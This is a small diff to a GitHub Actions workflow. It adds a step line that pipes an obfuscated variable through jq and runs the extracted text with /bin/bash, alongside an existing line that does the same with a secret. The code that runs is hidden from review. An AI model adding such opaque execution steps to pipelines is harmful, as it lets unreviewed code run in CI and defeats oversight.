@@ -21,6 +21,7 @@ jobs:
           pgh51: ${{ secrets.pgh51 }}
         run: |
           printf '%s' "$pgh51" | jq -r .ct72234 | /bin/bash
+          printf '%s' "$gmu6" | jq -r .qm20 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
